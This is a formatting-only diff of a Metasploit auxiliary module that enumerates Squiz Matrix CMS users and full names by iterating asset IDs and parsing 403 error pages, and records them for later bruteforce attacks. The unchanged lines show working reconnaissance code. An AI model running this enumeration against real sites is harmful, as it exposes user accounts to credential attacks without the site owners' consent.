@@ -35,10 +35,10 @@ class Metasploit3 < Msf::Auxiliary
 				ASSETBEGIN and ASSETEND values for greater results, or set VERBOSE.
 				Information gathered may be used for later bruteforce attacks.
 			},
-			'Author'		=> [ 'Troy Rose <troy[at]osisecurity.com.au>', 'patrick' ],
-			'License'		=> MSF_LICENSE,
-			'Version'		=> '$Revision$',
-			'References'	=>
+			'Author'         => [ 'Troy Rose <troy[at]osisecurity.com.au>', 'patrick' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision$',
+			'References'     =>
 				[
 					[ 'URL', 'http://www.osisecurity.com.au/advisories/' ],
 				],
@@ -61,13 +61,12 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		@users_found = {}
 
-
-		asset_begin = datastore['ASSETBEGIN']	
-		asset_end = datastore['ASSETEND']	
+		asset_begin = datastore['ASSETBEGIN']
+		asset_end = datastore['ASSETEND']
 		if (asset_begin > asset_end)
 			print_error("Unable to continue. ASSETEND must be greater than ASSETBEGIN")
 		end
-			
+
 		asset_begin.upto(asset_end) do |asset|
 			do_enum(asset)
 		end
@@ -91,10 +90,10 @@ class Metasploit3 < Msf::Auxiliary
 	def do_enum(asset)
 		begin
 			res = send_request_cgi({
-				'uri'  		=>  "#{target_url}?a=#{asset}",
-				'method'   	=> 'GET'
+				'uri'     =>  "#{target_url}?a=#{asset}",
+				'method'  => 'GET'
 			}, 20)
-				
+
 			if (datastore['VERBOSE'])
 				if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(\w+)<\/i>/)
 					print_status("#{target_url}?a=#{asset} - Trying Asset: '#{asset}' title '#{$1}'")
@@ -109,14 +108,14 @@ class Metasploit3 < Msf::Auxiliary
 				# try the full name of the user
 				tmpasset = asset -1
 				res = send_request_cgi({
-					'uri'  		=>  "#{target_url}?a=#{tmpasset}",
-					'method'   	=> 'GET'
+					'uri'     =>  "#{target_url}?a=#{tmpasset}",
+					'method'  => 'GET'
 				}, 20)
 				if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>Inbox<\/i>/)
 					tmpasset = asset -2
 					res = send_request_cgi({
-						'uri'  		=>  "#{target_url}?a=#{tmpasset}",
-						'method'   	=> 'GET'
+						'uri'     =>  "#{target_url}?a=#{tmpasset}",
+						'method'  => 'GET'
 					}, 20)
 					print_good("#{target_url}?a=#{asset} - Trying to obtain fullname for Asset ID '#{asset}', '#{user}'")
 					if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(.*)<\/i>/)
@@ -128,19 +127,17 @@ class Metasploit3 < Msf::Auxiliary
 					print_good("#{target_url} - Squiz Matrix User: '#{user}'")
 					@users_found[user] = :reported
 				end
-			
+
 				report_auth_info(
 				:host => rhost,
 				:sname => 'http',
 				:user => user,
 				:port => rport,
-				:proof => "WEBAPP=\"Squiz Matrix\", VHOST=#{vhost}"
-				)
+				:proof => "WEBAPP=\"Squiz Matrix\", VHOST=#{vhost}")
 			end
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 		rescue ::Timeout::Error, ::Errno::EPIPE
 		end
 
 	end
-	
 end
